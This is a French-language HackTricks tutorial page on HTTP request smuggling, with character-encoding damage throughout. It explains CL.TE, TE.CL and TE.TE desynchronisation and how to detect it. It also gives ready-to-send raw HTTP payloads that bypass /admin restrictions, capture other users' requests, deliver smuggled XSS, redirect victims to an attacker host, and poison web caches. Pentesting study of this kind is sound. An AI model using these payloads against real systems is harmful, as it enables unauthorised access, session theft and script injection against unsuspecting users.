# Attaque de Demande HTTP Smuggling / DÃ©synchronisation HTTP

<details>

<summary><strong>Apprenez le piratage AWS de zÃ©ro Ã  hÃ©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en Ã©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres faÃ§ons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncÃ©e dans HackTricks** ou **tÃ©lÃ©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* DÃ©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** ğŸ’¬ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dÃ©pÃ´ts GitHub.

</details>

## Qu'est-ce que c'est

Cette vulnÃ©rabilitÃ© se produit lorsqu'une **dÃ©synchronisation** entre les **proxys frontaux** et le **serveur back-end** permet Ã  un **attaquant** d'**envoyer** une **demande HTTP** qui sera **interprÃ©tÃ©e** comme une **seule demande** par les **proxys frontaux** (Ã©quilibrage de charge/proxy inverse) et **comme 2 demandes** par le **serveur back-end**.\
Cela permet Ã  un utilisateur de **modifier la prochaine demande qui arrive au serveur back-end aprÃ¨s la sienne**.

### ThÃ©orie

[**SpÃ©cification RFC (2161)**](https://tools.ietf.org/html/rfc2616)

> Si un message est reÃ§u Ã  la fois avec un champ d'en-tÃªte Transfer-Encoding et un champ d'en-tÃªte Content-Length, ce dernier DOIT Ãªtre ignorÃ©.

**Content-Length**

> L'en-tÃªte d'entitÃ© Content-Length indique la taille du corps de l'entitÃ©, en octets, envoyÃ© au destinataire.

**Transfer-Encoding: chunked**

> L'en-tÃªte Transfer-Encoding spÃ©cifie la forme de codage utilisÃ©e pour transfÃ©rer en toute sÃ©curitÃ© le corps de la charge utile Ã  l'utilisateur.\
> Chunked signifie que des donnÃ©es volumineuses sont envoyÃ©es sous forme de sÃ©ries de morceaux.

### RÃ©alitÃ©

Le **Front-End** (un Ã©quilibreur de charge / Proxy Inverse) **traite** l'en-tÃªte _**content-length**_ ou l'en-tÃªte _**transfer-encoding**_ et le **serveur Back-end** **traite l'autre** provoquant une **dÃ©synchronisation** entre les 2 systÃ¨mes.\
Cela pourrait Ãªtre trÃ¨s critique car **un attaquant pourra envoyer une demande** au proxy inverse qui sera **interprÃ©tÃ©e** par le **serveur back-end comme 2 demandes diffÃ©rentes**. Le **danger** de cette technique rÃ©side dans le fait que le **serveur back-end interprÃ©tera la 2Ã¨me demande injectÃ©e** comme si elle **venait du prochain client** et la **vraie demande** de ce client fera **partie** de la **demande injectÃ©e**.

### ParticularitÃ©s

Rappelez-vous qu'en HTTP **un caractÃ¨re de nouvelle ligne est composÃ© de 2 octets :**

* **Content-Length** : Cet en-tÃªte utilise un **nombre dÃ©cimal** pour indiquer le **nombre d'octets** du **corps** de la demande. Le corps est censÃ© se terminer par le dernier caractÃ¨re, **une nouvelle ligne n'est pas nÃ©cessaire Ã  la fin de la demande**.
* **Transfer-Encoding** : Cet en-tÃªte utilise dans le **corps** un **nombre hexadÃ©cimal** pour indiquer le **nombre d'octets** du **prochain morceau**. Le **morceau** doit se **terminer** par une **nouvelle ligne** mais cette nouvelle ligne **n'est pas comptÃ©e** par l'indicateur de longueur. Cette mÃ©thode de transfert doit se terminer par un **morceau de taille 0 suivi de 2 nouvelles lignes** : `0`
* **Connection** : D'aprÃ¨s mon expÃ©rience, il est recommandÃ© d'utiliser **`Connection: keep-alive`** sur la premiÃ¨re demande de la demande de Smuggling.

## Exemples de Base

{% hint style="success" %}
Lorsque vous essayez d'exploiter cela avec Burp Suite, **dÃ©sactivez `Mettre Ã  jour la longueur du contenu` et `Normaliser les fins de ligne HTTP/1`** dans le rÃ©pÃ©teur car certains gadgets abusent des sauts de ligne, des retours chariot et des longueurs de contenu mal formÃ©es.
{% endhint %}

Les attaques de demande de Smuggling HTTP sont Ã©laborÃ©es en envoyant des demandes ambiguÃ«s qui exploitent les divergences dans la faÃ§on dont les serveurs frontaux et back-end interprÃ¨tent les en-tÃªtes `Content-Length` (CL) et `Transfer-Encoding` (TE). Ces attaques peuvent se manifester sous diffÃ©rentes formes, principalement en tant que **CL.TE**, **TE.CL** et **TE.TE**. Chaque type reprÃ©sente une combinaison unique de la priorisation de ces en-tÃªtes par les serveurs frontaux et back-end. Les vulnÃ©rabilitÃ©s dÃ©coulent du traitement de la mÃªme demande par les serveurs de diffÃ©rentes maniÃ¨res, entraÃ®nant des rÃ©sultats inattendus et potentiellement malveillants.

### Exemples de Types de VulnÃ©rabilitÃ©s de Base

![https://twitter.com/SpiderSec/status/1200413390339887104?ref\_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104\&ref\_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104](../../.gitbook/assets/EKi5edAUUAAIPIK.jpg)

#### VulnÃ©rabilitÃ© CL.TE (Content-Length utilisÃ© par le Front-End, Transfer-Encoding utilisÃ© par le Back-End)

* **Front-End (CL) :** Traite la demande en fonction de l'en-tÃªte `Content-Length`.
* **Back-End (TE) :** Traite la demande en fonction de l'en-tÃªte `Transfer-Encoding`.
* **ScÃ©nario d'attaque :**
* L'attaquant envoie une demande oÃ¹ la valeur de l'en-tÃªte `Content-Length` ne correspond pas Ã  la longueur rÃ©elle du contenu.
* Le serveur front-end transmet la demande entiÃ¨re au serveur back-end, en fonction de la valeur de `Content-Length`.
* Le serveur back-end traite la demande en morceaux en raison de l'en-tÃªte `Transfer-Encoding: chunked`, interprÃ©tant les donnÃ©es restantes comme une demande sÃ©parÃ©e et ultÃ©rieure.
*   **Exemple :**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 30
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Foo: x
```

#### VulnÃ©rabilitÃ© TE.CL (Transfer-Encoding utilisÃ© par le Front-End, Content-Length utilisÃ© par le Back-End)

* **Front-End (TE) :** Traite la demande en fonction de l'en-tÃªte `Transfer-Encoding`.
* **Back-End (CL) :** Traite la demande en fonction de l'en-tÃªte `Content-Length`.
* **ScÃ©nario d'attaque :**
* L'attaquant envoie une demande fragmentÃ©e oÃ¹ la taille du fragment (`7b`) et la longueur rÃ©elle du contenu (`Content-Length: 4`) ne correspondent pas.
* Le serveur front-end, respectant `Transfer-Encoding`, transmet la demande entiÃ¨re au serveur back-end.
* Le serveur back-end, respectant `Content-Length`, traite uniquement la partie initiale de la demande (`7b` octets), laissant le reste comme faisant partie d'une demande ultÃ©rieure non intentionnelle.
*   **Exemple :**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 4
Connection: keep-alive
Transfer-Encoding: chunked

7b
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

x=
0

```
#### VulnÃ©rabilitÃ© TE.TE (Transfer-Encoding utilisÃ© par les deux, avec obfuscation)

* **Serveurs :** Les deux prennent en charge `Transfer-Encoding`, mais l'un peut Ãªtre trompÃ© pour l'ignorer via l'obfuscation.
* **ScÃ©nario d'attaque :**
* L'attaquant envoie une requÃªte avec des en-tÃªtes `Transfer-Encoding` obfusquÃ©s.
* Selon le serveur (frontal ou arriÃ¨re) qui ne parvient pas Ã  reconnaÃ®tre l'obfuscation, une vulnÃ©rabilitÃ© CL.TE ou TE.CL peut Ãªtre exploitÃ©e.
* La partie non traitÃ©e de la requÃªte, telle que vue par l'un des serveurs, devient une partie d'une requÃªte ultÃ©rieure, conduisant Ã  un trafic illicite.
*   **Exemple :**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

#### **ScÃ©nario CL.CL (Content-Length utilisÃ© par Ã  la fois le Front-End et le Back-End) :**

* Les deux serveurs traitent la requÃªte uniquement en fonction de l'en-tÃªte `Content-Length`.
* Ce scÃ©nario ne conduit gÃ©nÃ©ralement pas au trafic illicite, car il y a une concordance dans la faÃ§on dont les deux serveurs interprÃ¨tent la longueur de la requÃªte.
*   **Exemple :**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

RequÃªte normale
```

#### **ScÃ©nario CL != 0 :**

* Fait rÃ©fÃ©rence aux scÃ©narios oÃ¹ l'en-tÃªte `Content-Length` est prÃ©sent et a une valeur autre que zÃ©ro, indiquant que le corps de la requÃªte contient du contenu.
* Il est crucial de comprendre et de concevoir des attaques de trafic illicite, car cela influence la faÃ§on dont les serveurs dÃ©terminent la fin d'une requÃªte.
*   **Exemple :**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Corps non vide
```

#### Casser le serveur web

Cette technique est Ã©galement utile dans les scÃ©narios oÃ¹ il est possible de **casser un serveur web tout en lisant les donnÃ©es HTTP initiales** mais **sans fermer la connexion**. De cette maniÃ¨re, le **corps** de la requÃªte HTTP sera considÃ©rÃ© comme la **prochaine requÃªte HTTP**.

Par exemple, comme expliquÃ© dans [**ce compte-rendu**](https://mizu.re/post/twisty-python), avec Werkzeug, il Ã©tait possible d'envoyer certains caractÃ¨res **Unicode** et cela faisait **planter** le serveur. Cependant, si la connexion HTTP Ã©tait crÃ©Ã©e avec l'en-tÃªte **`Connection: keep-alive`**, le corps de la requÃªte ne serait pas lu et la connexion resterait ouverte, donc le **corps** de la requÃªte serait traitÃ© comme la **prochaine requÃªte HTTP**.

#### Forcer via les en-tÃªtes hop-by-hop

En abusant des en-tÃªtes hop-by-hop, vous pourriez indiquer au proxy de **supprimer l'en-tÃªte Content-Length ou Transfer-Encoding pour qu'une attaque de trafic illicite HTTP soit possible Ã  exploiter**.
```
Connection: Content-Length
```
Pour **plus d'informations sur les en-tÃªtes hop-by-hop**, visitez :

{% content-ref url="../abusing-hop-by-hop-headers.md" %}
[abusing-hop-by-hop-headers.md](../abusing-hop-by-hop-headers.md)
{% endcontent-ref %}

## Identification de la faille de requÃªte HTTP Smuggling

L'identification des vulnÃ©rabilitÃ©s de requÃªte HTTP smuggling peut souvent Ãªtre rÃ©alisÃ©e en utilisant des techniques de synchronisation, qui reposent sur l'observation du temps nÃ©cessaire au serveur pour rÃ©pondre aux requÃªtes manipulÃ©es. Ces techniques sont particuliÃ¨rement utiles pour dÃ©tecter les vulnÃ©rabilitÃ©s CL.TE et TE.CL. Outre ces mÃ©thodes, il existe d'autres stratÃ©gies et outils qui peuvent Ãªtre utilisÃ©s pour trouver de telles vulnÃ©rabilitÃ©s :

### Recherche de vulnÃ©rabilitÃ©s CL.TE en utilisant des techniques de synchronisation

* **MÃ©thode :**
* Envoyer une requÃªte qui, si l'application est vulnÃ©rable, amÃ¨nera le serveur back-end Ã  attendre des donnÃ©es supplÃ©mentaires.
*   **Exemple :**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```
* **Observation :**
* Le serveur front-end traite la requÃªte en fonction de `Content-Length` et coupe le message prÃ©maturÃ©ment.
* Le serveur back-end, s'attendant Ã  un message chunked, attend le prochain chunk qui n'arrive jamais, provoquant un retard.
* **Indicateurs :**
* DÃ©lais d'attente ou longs retards dans la rÃ©ponse.
* RÃ©ception d'une erreur 400 Bad Request du serveur back-end, parfois avec des informations dÃ©taillÃ©es sur le serveur.

### Recherche de vulnÃ©rabilitÃ©s TE.CL en utilisant des techniques de synchronisation

* **MÃ©thode :**
* Envoyer une requÃªte qui, si l'application est vulnÃ©rable, amÃ¨nera le serveur back-end Ã  attendre des donnÃ©es supplÃ©mentaires.
*   **Exemple :**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```
* **Observation :**
* Le serveur front-end traite la requÃªte en fonction de `Transfer-Encoding` et transmet l'intÃ©gralitÃ© du message.
* Le serveur back-end, s'attendant Ã  un message basÃ© sur `Content-Length`, attend des donnÃ©es supplÃ©mentaires qui n'arrivent jamais, provoquant un retard.

### Autres mÃ©thodes pour trouver des vulnÃ©rabilitÃ©s

* **Analyse de rÃ©ponse diffÃ©rentielle :**
* Envoyer des versions lÃ©gÃ¨rement variÃ©es d'une requÃªte et observer si les rÃ©ponses du serveur diffÃ¨rent de maniÃ¨re inattendue, indiquant une divergence d'analyse.
* **Utilisation d'outils automatisÃ©s :**
* Des outils comme l'extension 'HTTP Request Smuggler' de Burp Suite peuvent tester automatiquement ces vulnÃ©rabilitÃ©s en envoyant diverses formes de requÃªtes ambiguÃ«s et en analysant les rÃ©ponses.
* **Tests de variance de Content-Length :**
* Envoyer des requÃªtes avec des valeurs de `Content-Length` variables qui ne correspondent pas Ã  la longueur de contenu rÃ©elle et observer comment le serveur gÃ¨re de telles incohÃ©rences.
* **Tests de variance de Transfer-Encoding :**
* Envoyer des requÃªtes avec des en-tÃªtes `Transfer-Encoding` obfusquÃ©s ou malformÃ©s et surveiller comment les serveurs front-end et back-end rÃ©pondent diffÃ©remment Ã  de telles manipulations.

### Test de vulnÃ©rabilitÃ© de la requÃªte HTTP Smuggling

AprÃ¨s avoir confirmÃ© l'efficacitÃ© des techniques de synchronisation, il est crucial de vÃ©rifier si les requÃªtes des clients peuvent Ãªtre manipulÃ©es. Une mÃ©thode simple consiste Ã  tenter de falsifier vos requÃªtes, par exemple, en faisant en sorte qu'une requÃªte vers `/` renvoie une rÃ©ponse 404. Les exemples `CL.TE` et `TE.CL` discutÃ©s prÃ©cÃ©demment dans [Exemples de base](./#basic-examples) montrent comment falsifier une requÃªte du client pour obtenir une rÃ©ponse 404, malgrÃ© le fait que le client cherche Ã  accÃ©der Ã  une ressource diffÃ©rente.

**ConsidÃ©rations clÃ©s**

Lors du test des vulnÃ©rabilitÃ©s de la requÃªte smuggling en interfÃ©rant avec d'autres requÃªtes, gardez Ã  l'esprit :

* **Connexions rÃ©seau distinctes :** Les requÃªtes "d'attaque" et "normales" doivent Ãªtre envoyÃ©es sur des connexions rÃ©seau distinctes. Utiliser la mÃªme connexion pour les deux ne valide pas la prÃ©sence de la vulnÃ©rabilitÃ©.
* **URL et paramÃ¨tres cohÃ©rents :** Essayez d'utiliser des URL et des noms de paramÃ¨tres identiques pour les deux requÃªtes. Les applications modernes routent souvent les requÃªtes vers des serveurs back-end spÃ©cifiques en fonction de l'URL et des paramÃ¨tres. En les faisant correspondre, vous augmentez la probabilitÃ© que les deux requÃªtes soient traitÃ©es par le mÃªme serveur, une condition prÃ©alable Ã  une attaque rÃ©ussie.
* **Synchronisation et conditions de course :** La requÃªte "normale", destinÃ©e Ã  dÃ©tecter les interfÃ©rences de la requÃªte "d'attaque", est en concurrence avec d'autres requÃªtes d'application concurrentes. Par consÃ©quent, envoyez la requÃªte "normale" immÃ©diatement aprÃ¨s la requÃªte "d'attaque". Les applications chargÃ©es peuvent nÃ©cessiter plusieurs essais pour confirmer de maniÃ¨re concluante la vulnÃ©rabilitÃ©.
* **DÃ©fis de l'Ã©quilibrage de charge :** Les serveurs frontaux agissant comme Ã©quilibreurs de charge peuvent distribuer les requÃªtes sur divers systÃ¨mes back-end. Si les requÃªtes "d'attaque" et "normales" se retrouvent sur des systÃ¨mes diffÃ©rents, l'attaque Ã©chouera. Cet aspect de l'Ã©quilibrage de charge peut nÃ©cessiter plusieurs tentatives pour confirmer une vulnÃ©rabilitÃ©.
* **Impact utilisateur non intentionnel :** Si votre attaque affecte involontairement une autre requÃªte utilisateur (pas la requÃªte "normale" que vous avez envoyÃ©e pour la dÃ©tection), cela indique que votre attaque a influencÃ© un autre utilisateur de l'application. Des tests continus pourraient perturber d'autres utilisateurs, exigeant une approche prudente.

## Abus de la requÃªte HTTP Smuggling

### Contournement de la sÃ©curitÃ© frontale via la requÃªte HTTP Smuggling

Parfois, les proxies frontaux appliquent des mesures de sÃ©curitÃ©, scrutant les requÃªtes entrantes. Cependant, ces mesures peuvent Ãªtre contournÃ©es en exploitant la requÃªte HTTP Smuggling, permettant un accÃ¨s non autorisÃ© aux points de terminaison restreints. Par exemple, l'accÃ¨s Ã  `/admin` peut Ãªtre interdit de l'extÃ©rieur, le proxy frontal bloquant activement de telles tentatives. NÃ©anmoins, ce proxy peut nÃ©gliger d'inspecter les requÃªtes intÃ©grÃ©es dans une requÃªte HTTP smugglÃ©e, laissant une faille pour contourner ces restrictions.

ConsidÃ©rez les exemples suivants illustrant comment la requÃªte HTTP Smuggling peut Ãªtre utilisÃ©e pour contourner les contrÃ´les de sÃ©curitÃ© frontaux, ciblant spÃ©cifiquement le chemin `/admin` qui est gÃ©nÃ©ralement protÃ©gÃ© par le proxy frontal :

**Exemple CL.TE**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Transfer-Encoding: chunked

0
GET /admin HTTP/1.1
Host: localhost
Content-Length: 10

x=
```
Dans l'attaque CL.TE, l'en-tÃªte `Content-Length` est exploitÃ© pour la requÃªte initiale, tandis que la requÃªte intÃ©grÃ©e ultÃ©rieure utilise l'en-tÃªte `Transfer-Encoding: chunked`. Le proxy frontal traite la requÃªte `POST` initiale mais ne parvient pas Ã  inspecter la requÃªte `GET /admin` intÃ©grÃ©e, permettant un accÃ¨s non autorisÃ© au chemin `/admin`.

**Exemple TE.CL**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 4
Transfer-Encoding: chunked
2b
GET /admin HTTP/1.1
Host: localhost
a=x
0

```
### RÃ©vÃ©ler la rÃ©Ã©criture de la requÃªte frontale <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

Les applications utilisent souvent un **serveur frontal** pour modifier les requÃªtes entrantes avant de les transmettre au serveur back-end. Une modification typique implique l'ajout d'en-tÃªtes, tels que `X-Forwarded-For: <IP du client>`, pour transmettre l'IP du client au back-end. Comprendre ces modifications peut Ãªtre crucial, car cela pourrait rÃ©vÃ©ler des moyens de **contourner les protections** ou de **dÃ©couvrir des informations ou des points d'accÃ¨s dissimulÃ©s**.

Pour enquÃªter sur la maniÃ¨re dont un proxy modifie une requÃªte, localisez un paramÃ¨tre POST que le back-end renvoie dans la rÃ©ponse. Ensuite, crÃ©ez une requÃªte en utilisant ce paramÃ¨tre en dernier, similaire Ã  ce qui suit:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Connection: keep-alive
Transfer-Encoding: chunked

0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

search=
```
Dans cette structure, les composants de la requÃªte suivante sont ajoutÃ©s aprÃ¨s `search=`, qui est le paramÃ¨tre reflÃ©tÃ© dans la rÃ©ponse. Cette rÃ©flexion exposera les en-tÃªtes de la requÃªte suivante.

Il est important d'aligner l'en-tÃªte `Content-Length` de la requÃªte imbriquÃ©e avec la longueur rÃ©elle du contenu. Il est conseillÃ© de commencer par une petite valeur et d'augmenter progressivement, car une valeur trop basse tronquera les donnÃ©es reflÃ©tÃ©es, tandis qu'une valeur trop Ã©levÃ©e peut provoquer une erreur de requÃªte.

Cette technique est Ã©galement applicable dans le contexte d'une vulnÃ©rabilitÃ© TE.CL, mais la requÃªte doit se terminer par `search=\r\n0`. Peu importe les caractÃ¨res de saut de ligne, les valeurs seront ajoutÃ©es au paramÃ¨tre de recherche.

Cette mÃ©thode sert principalement Ã  comprendre les modifications de la requÃªte effectuÃ©es par le proxy frontal, rÃ©alisant essentiellement une enquÃªte auto-dirigÃ©e.

### Capture des requÃªtes d'autres utilisateurs <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>

Il est possible de capturer les requÃªtes de l'utilisateur suivant en ajoutant une requÃªte spÃ©cifique en tant que valeur d'un paramÃ¨tre lors d'une opÃ©ration POST. Voici comment cela peut Ãªtre accompli :

En ajoutant la requÃªte suivante en tant que valeur d'un paramÃ¨tre, vous pouvez enregistrer la requÃªte du client suivant :
```
POST / HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 319
Connection: keep-alive
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Length: 659
Content-Type: application/x-www-form-urlencoded
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi

csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=asdfghjklo&email=email%40email.com&comment=
```
Dans ce scÃ©nario, le **paramÃ¨tre de commentaire** est destinÃ© Ã  stocker le contenu dans la section commentaire d'un article sur une page publiquement accessible. Par consÃ©quent, le contenu de la requÃªte suivante apparaÃ®tra comme un commentaire.

Cependant, cette technique prÃ©sente des limitations. En gÃ©nÃ©ral, elle ne capture que les donnÃ©es jusqu'au dÃ©limiteur de paramÃ¨tre utilisÃ© dans la requÃªte trafiquÃ©e. Pour les soumissions de formulaires encodÃ©es en URL, ce dÃ©limiteur est le caractÃ¨re `&`. Cela signifie que le contenu capturÃ© de la requÃªte de l'utilisateur victime s'arrÃªtera au premier `&`, qui peut mÃªme faire partie de la chaÃ®ne de requÃªte.

De plus, il convient de noter que cette approche est Ã©galement viable avec une vulnÃ©rabilitÃ© TE.CL. Dans de tels cas, la requÃªte devrait se terminer par `search=\r\n0`. Peu importe les caractÃ¨res de saut de ligne, les valeurs seront ajoutÃ©es au paramÃ¨tre de recherche.

### Utilisation du trafic de requÃªtes HTTP pour exploiter les XSS rÃ©flÃ©chis

Le trafic de requÃªtes HTTP peut Ãªtre utilisÃ© pour exploiter les pages web vulnÃ©rables aux **XSS rÃ©flÃ©chis**, offrant des avantages significatifs :

* L'interaction avec les utilisateurs cibles n'est **pas nÃ©cessaire**.
* Permet l'exploitation de XSS dans des parties de la requÃªte normalement **inaccessibles**, comme les en-tÃªtes de requÃªte HTTP.

Dans les scÃ©narios oÃ¹ un site web est susceptible aux XSS rÃ©flÃ©chis via l'en-tÃªte User-Agent, la charge utile suivante dÃ©montre comment exploiter cette vulnÃ©rabilitÃ© :
```
POST / HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Cookie: session=ac311fa41f0aa1e880b0594d008d009e
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 213
Content-Type: application/x-www-form-urlencoded

0

GET /post?postId=2 HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: "><script>alert(1)</script>
Content-Length: 10
Content-Type: application/x-www-form-urlencoded

A=
```
Ce payload est structurÃ© pour exploiter la vulnÃ©rabilitÃ© en :

1. Initiating une requÃªte `POST`, apparemment typique, avec un en-tÃªte `Transfer-Encoding: chunked` pour indiquer le dÃ©but du smuggling.
2. EnchaÃ®nant avec un `0`, marquant la fin du corps du message chunked.
3. Ensuite, une requÃªte `GET` smugglÃ©e est introduite, oÃ¹ l'en-tÃªte `User-Agent` est injectÃ© avec un script, `<script>alert(1)</script>`, dÃ©clenchant le XSS lorsque le serveur traite cette requÃªte ultÃ©rieure.

En manipulant l'en-tÃªte `User-Agent` via le smuggling, le payload contourne les contraintes normales de la requÃªte, exploitant ainsi la vulnÃ©rabilitÃ© XSS rÃ©flÃ©chie d'une maniÃ¨re non standard mais efficace.

#### HTTP/0.9

{% hint style="danger" %}
Dans le cas oÃ¹ le contenu de l'utilisateur est reflÃ©tÃ© dans une rÃ©ponse avec un **`Content-type`** tel que **`text/plain`**, empÃªchant l'exÃ©cution du XSS. Si le serveur prend en charge **HTTP/0.9, il pourrait Ãªtre possible de contourner cela** !
{% endhint %}

La version HTTP/0.9 Ã©tait antÃ©rieure Ã  la 1.0 et utilise uniquement les verbes **GET** et ne rÃ©pond pas avec des **en-tÃªtes**, seulement le corps.

Dans [**ce compte rendu**](https://mizu.re/post/twisty-python), cela a Ã©tÃ© abusÃ© avec un smuggling de requÃªte et un **point d'extrÃ©mitÃ© vulnÃ©rable qui rÃ©pondra avec l'entrÃ©e de l'utilisateur** pour smuggler une requÃªte avec HTTP/0.9. Le paramÃ¨tre qui sera reflÃ©tÃ© dans la rÃ©ponse contenait une **fausse rÃ©ponse HTTP/1.1 (avec des en-tÃªtes et un corps)** donc la rÃ©ponse contiendra un code JS exÃ©cutable valide avec un `Content-Type` de `text/html`.

### Exploiter les redirections sur site avec le Smuggling de RequÃªte HTTP <a href="#exploiting-on-site-redirects-with-http-request-smuggling" id="exploiting-on-site-redirects-with-http-request-smuggling"></a>

Les applications redirigent souvent d'une URL Ã  une autre en utilisant le nom d'hÃ´te de l'en-tÃªte `Host` dans l'URL de redirection. C'est courant avec des serveurs web comme Apache et IIS. Par exemple, demander un dossier sans barre oblique finale entraÃ®ne une redirection pour inclure la barre oblique :
```
GET /home HTTP/1.1
Host: normal-website.com
```
RÃ©sultats :
```
HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```
Bien que semblant inoffensif, ce comportement peut Ãªtre manipulÃ© en utilisant le trafic d'HTTP pour rediriger les utilisateurs vers un site externe. Par exemple:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```
Cette requÃªte dissimulÃ©e pourrait entraÃ®ner la redirection de la prochaine requÃªte utilisateur traitÃ©e vers un site web contrÃ´lÃ© par un attaquant :
```
GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /scripts/include.js HTTP/1.1
Host: vulnerable-website.com
```
RÃ©sultats :
```
HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```
Dans ce scÃ©nario, la demande d'un utilisateur pour un fichier JavaScript est dÃ©tournÃ©e. L'attaquant peut potentiellement compromettre l'utilisateur en fournissant du JavaScript malveillant en rÃ©ponse.

### Exploitation de l'empoisonnement du cache Web via le dÃ©tournement de requÃªte HTTP <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

L'empoisonnement du cache Web peut Ãªtre exÃ©cutÃ© si une composante de l'**infrastructure frontale met en cache le contenu**, gÃ©nÃ©ralement pour amÃ©liorer les performances. En manipulant la rÃ©ponse du serveur, il est possible de **contaminer le cache**.

PrÃ©cÃ©demment, nous avons observÃ© comment les rÃ©ponses du serveur pouvaient Ãªtre modifiÃ©es pour renvoyer une erreur 404 (voir [Exemples de base](./#basic-examples)). De maniÃ¨re similaire, il est possible de tromper le serveur pour qu'il renvoie le contenu `/index.html` en rÃ©ponse Ã  une demande pour `/static/include.js`. Par consÃ©quent, le contenu `/static/include.js` est remplacÃ© dans le cache par celui de `/index.html`, rendant `/static/include.js` inaccessible aux utilisateurs, potentiellement entraÃ®nant un dÃ©ni de service (DoS).

Cette technique devient particuliÃ¨rement puissante si une **vulnÃ©rabilitÃ© de redirection ouverte** est dÃ©couverte ou s'il y a une **redirection sur site vers une redirection ouverte**. De telles vulnÃ©rabilitÃ©s peuvent Ãªtre exploitÃ©es pour remplacer le contenu mis en cache de `/static/include.js` par un script sous le contrÃ´le de l'attaquant, permettant essentiellement une attaque gÃ©nÃ©ralisÃ©e de Cross-Site Scripting (XSS) contre tous les clients demandant le `/static/include.js` mis Ã  jour.

Voici une illustration de l'exploitation de **l'empoisonnement du cache combinÃ© Ã  une redirection sur site vers une redirection ouverte**. L'objectif est de modifier le contenu mis en cache de `/static/include.js` pour servir du code JavaScript contrÃ´lÃ© par l'attaquant:
```
POST / HTTP/1.1
Host: vulnerable.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 124
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: attacker.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```
Notez la requÃªte intÃ©grÃ©e ciblant `/post/next?postId=3`. Cette requÃªte sera redirigÃ©e vers `/post?postId=4`, en utilisant la **valeur de l'en-tÃªte Host** pour dÃ©terminer le domaine. En modifiant l'en-tÃªte **Host**, l'attaquant peut rediriger la requÃªte vers son domaine (**redirection sur site vers une redirection ouverte**).

AprÃ¨s un **empoisonnement de socket** rÃ©ussi, une requÃªte **GET** pour `/static/include.js` doit Ãªtre initiÃ©e. Cette requÃªte sera contaminÃ©e par la prÃ©cÃ©dente requÃªte de **redirection sur site vers une redirection ouverte** et rÃ©cupÃ©rera le contenu du script contrÃ´lÃ© par l'attaquant.

Par la suite, toute requÃªte pour `/static/include.js` servira le contenu mis en cache du script de l'attaquant, lanÃ§ant ainsi efficacement une large attaque XSS.

